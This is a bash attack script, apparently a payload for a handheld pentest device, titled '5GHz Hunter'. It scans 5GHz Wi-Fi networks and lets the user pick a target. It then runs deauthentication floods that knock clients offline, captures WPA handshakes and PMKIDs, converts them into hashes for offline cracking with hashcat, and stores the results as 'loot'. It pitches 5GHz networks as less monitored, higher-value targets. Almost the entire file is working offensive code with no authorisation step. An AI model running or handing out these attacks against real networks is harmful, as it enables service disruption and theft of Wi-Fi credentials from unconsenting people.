#!/bin/bash
# Title: 5GHz Hunter
# Author: bad-antics
# Description: Target and attack 5GHz networks (often less monitored)
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/5ghz_hunter"
mkdir -p "$LOOT_DIR"

PROMPT "5GHz BAND HUNTER

Target 5GHz networks which
are often:
• Less monitored
• Higher bandwidth
• Corporate preferred
• IoT device heavy

Press OK to scan."

# Check for 5GHz capable interface
if ! iw list 2>/dev/null | grep -q "5180 MHz"; then
    ERROR_DIALOG "No 5GHz capable
interface detected!"
    exit 1
fi

SPINNER_START "Scanning 5GHz band..."

# Scan 5GHz channels (36-165)
airodump-ng wlan0 --band a --write-interval 1 -w /tmp/5ghz_scan --output-format csv &
SCAN_PID=$!
sleep 20
kill $SCAN_PID 2>/dev/null

SPINNER_STOP

# Parse results
NETWORKS=$(grep -E "^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" /tmp/5ghz_scan*.csv 2>/dev/null | head -20)
NET_COUNT=$(echo "$NETWORKS" | wc -l)

PROMPT "Found $NET_COUNT 5GHz networks

5GHz advantages:
• Faster handshake capture
• Less interference  
• Higher value targets

Select attack type next."

# Attack menu
ATTACK_TYPE=$(LIST_PICKER "Select Attack:" "1. Handshake Capture" "2. Deauth Flood" "3. PMKID Attack" "4. Full Audit")

case $ATTACK_TYPE in
    0) ATTACK="handshake" ;;
    1) ATTACK="deauth" ;;
    2) ATTACK="pmkid" ;;
    3) ATTACK="audit" ;;
    *) exit 0 ;;
esac

TARGET_NUM=$(NUMBER_PICKER "Target network #:" 1)
TARGET_LINE=$(echo "$NETWORKS" | sed -n "${TARGET_NUM}p")
TARGET_BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
TARGET_CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
TARGET_SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')

PROMPT "Target: $TARGET_SSID
BSSID: $TARGET_BSSID
Channel: $TARGET_CHANNEL
Attack: $ATTACK

Starting attack..."

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOOT_FILE="$LOOT_DIR/${ATTACK}_${TIMESTAMP}"

case $ATTACK in
    "handshake")
        SPINNER_START "Capturing WPA handshake..."
        
        # Start capture
        airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w "$LOOT_FILE" wlan0 &
        CAP_PID=$!
        sleep 5
        
        # Deauth to force handshake
        aireplay-ng --deauth 10 -a $TARGET_BSSID wlan1 2>/dev/null
        
        # Wait for handshake
        for i in $(seq 1 30); do
            if aircrack-ng "${LOOT_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
                break
            fi
            sleep 2
        done
        
        kill $CAP_PID 2>/dev/null
        SPINNER_STOP
        
        if aircrack-ng "${LOOT_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
            PROMPT "Handshake captured!

Saved to:
${LOOT_FILE}.cap

Ready for offline
cracking."
        else
            PROMPT "No handshake captured.

Try again or use
PMKID attack instead."
        fi
        ;;
        
    "pmkid")
        SPINNER_START "Attempting PMKID capture..."
        
        # Use hcxdumptool for PMKID
        timeout 60 hcxdumptool -i wlan0 -o "${LOOT_FILE}.pcapng" --filterlist_ap=$TARGET_BSSID --filtermode=2 2>/dev/null
        
        # Convert to hashcat format
        hcxpcapngtool -o "${LOOT_FILE}.22000" "${LOOT_FILE}.pcapng" 2>/dev/null
        
        SPINNER_STOP
        
        if [ -s "${LOOT_FILE}.22000" ]; then
            PROMPT "PMKID captured!

Hash saved to:
${LOOT_FILE}.22000

Crack with hashcat:
hashcat -m 22000"
        else
            PROMPT "No PMKID obtained.

Target may not be
vulnerable."
        fi
        ;;
        
    "deauth")
        DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
        
        SPINNER_START "Deauth flooding..."
        
        timeout $DURATION aireplay-ng --deauth 0 -a $TARGET_BSSID wlan1 2>/dev/null
        
        SPINNER_STOP
        
        PROMPT "Deauth complete!

Clients disconnected
from target network."
        ;;
        
    "audit")
        SPINNER_START "Running full audit..."
        
        # Handshake capture
        airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w "${LOOT_FILE}_cap" wlan0 &
        CAP_PID=$!
        sleep 3
        aireplay-ng --deauth 5 -a $TARGET_BSSID wlan1 2>/dev/null
        sleep 10
        kill $CAP_PID 2>/dev/null
        
        # PMKID attempt
        timeout 30 hcxdumptool -i wlan0 -o "${LOOT_FILE}_pmkid.pcapng" --filterlist_ap=$TARGET_BSSID --filtermode=2 2>/dev/null
        hcxpcapngtool -o "${LOOT_FILE}_pmkid.22000" "${LOOT_FILE}_pmkid.pcapng" 2>/dev/null
        
        # Client enumeration
        grep "$TARGET_BSSID" /tmp/5ghz_scan*.csv | cut -d',' -f1 > "${LOOT_FILE}_clients.txt"
        
        SPINNER_STOP
        
        PROMPT "Audit Complete!

Results saved to:
$LOOT_DIR

• Handshake: Check .cap
• PMKID: Check .22000
• Clients: _clients.txt"
        ;;
esac

echo "Attack: $ATTACK" >> "$LOOT_DIR/audit_log.txt"
echo "Target: $TARGET_SSID ($TARGET_BSSID)" >> "$LOOT_DIR/audit_log.txt"
echo "Time: $(date)" >> "$LOOT_DIR/audit_log.txt"
echo "---" >> "$LOOT_DIR/audit_log.txt"
